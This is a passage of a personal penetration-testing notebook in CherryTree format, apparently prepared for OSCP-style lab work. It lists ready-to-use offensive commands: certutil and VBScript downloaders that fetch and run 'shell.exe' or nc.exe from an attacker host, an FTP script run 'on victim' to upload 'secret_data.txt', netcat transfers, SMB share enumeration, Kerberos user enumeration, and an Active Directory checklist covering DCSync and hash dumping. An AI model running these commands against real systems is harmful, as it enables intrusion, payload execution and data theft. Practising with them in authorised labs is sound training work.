        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1696697351">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



______________________________________________________________________________



</rich_text>
          <rich_text link="webs https://github.com/nigamelastic/cheat-sheets/blob/main/General/FTP.md#quick-ftp-transfer-from-windows-target-to-kali-attacker" scale="h2">Quick FTP transfer from windows target to kali attacker</rich_text>
          <rich_text>
Start FTP on Attacker Machine:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>&#13;    

On Target Machine Use the following to transfer the file to Attacker:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">atftpd --daemon --port 69 /var/tmp</codebox>
          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tftp -i 192.168.0.1 GET whoami.exe</codebox>
          <codebox char_offset="306" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python -m pyftpdlib -p 4444 -u yo -P 123 -w </codebox>
          <codebox char_offset="387" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PS C:\Users\nathan&gt; ftp&#13;
ftp&gt; open 192.168.119.185 4444&#13;
Connected to 192.168.119.185.&#13;
220 pyftpdlib 1.5.7 ready.&#13;
530 Log in with USER and PASS first.&#13;
User (192.168.119.185:(none)): yo&#13;
331 Username ok, send password.&#13;
Password:&#13;
230 Login successful.&#13;
ftp&gt; put jehe.jeher&#13;
200 Active data connection established.&#13;
125 Data connection already open. Transfer starting.&#13;
226 Transfer complete.&#13;
ftp: 52 bytes sent in 0.06Seconds 0.84Kbytes/sec.&#13;
ftp&gt;</codebox>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1699312865">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>:

Definitely use it when u see `cgi-bin`  (even with http 403)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_______________________________________

</rich_text>
        <rich_text scale="h2">Using Proxy:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



________________________________________

</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

To ignore ssl certificate use </rich_text>
        <rich_text family="monospace">-k </rich_text>
        <rich_text>flag</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.58 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="167" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
        <codebox char_offset="225" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.10.10.58:3128 -e -u http://10.10.10.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@10.10.10.58  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwarding:</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.10.10.58 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.10.10.58</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.58 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.58 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1698786658">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
_____________________________________
</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Also check if u can put something in it:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

once put u can check accesing them and try something like this </rich_text>
        <rich_text link="node 98">URI File Attack</rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or anonymous

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

make sure if the directory has `$` in the end its also in ur directoryName
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


_________________________________________

</rich_text>
        <rich_text scale="h2">Cadaver</rich_text>
        <rich_text>

Can be used to upload or download from smb shares

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Asks for username
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from local to remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


____________________________________________

Also check



</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>

Especially

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.10.58</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.10.58</codebox>
        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.10.58   </codebox>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.58/directoryName -U &lt;username&gt;

recurse ON
prompt OFF
mget *</codebox>
        <codebox char_offset="179" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="321" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.58</codebox>
        <codebox char_offset="345" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.58 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="362" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.58 -u guest -p &lt;pass&gt;</codebox>
        <codebox char_offset="412" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.10.10.58</codebox>
        <codebox char_offset="552" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.58</codebox>
        <codebox char_offset="559" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.10.10.58</codebox>
        <codebox char_offset="666" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.10.10.58</codebox>
        <codebox char_offset="687" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
Password: &lt;password&gt;</codebox>
        <codebox char_offset="721" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="746" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
        <codebox char_offset="836" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.58 --shares -u '' -p ''</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1698812150">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Methodology:</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text link="node 36">nmap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 34">smb</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 45">ldapsearch</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 89">88 Kerberos Auth</rich_text>
        <rich_text>
☐ checkwinpeas (add any other user or credentials)
☐ if u find </rich_text>
        <rich_text family="monospace">users</rich_text>
        <rich_text> make sure if there are matching users using </rich_text>
        <rich_text family="monospace">net user </rich_text>
        <rich_text>command or/and checking </rich_text>
        <rich_text family="monospace">dir c:/Users</rich_text>
        <rich_text>
☐ use blood hound (check and update priveleges)
☐ DCSync </rich_text>
        <rich_text link="node 100">DACL/DC-Sync</rich_text>
        <rich_text>
☐ run </rich_text>
        <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
        <rich_text> dump with ur initial set of credentials to get priviliged hashes
_______________________________________________________________



</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/">https://exploit-notes.hdks.org/exploit/windows/active-directory/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</rich_text>
        <rich_text>
________________________________________
</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <rich_text>


Exe files to use for redteam:


</rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697239770">
          <rich_text>

Check: </rich_text>
          <rich_text link="webs https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="109" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.10.10.58 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.10.10.58
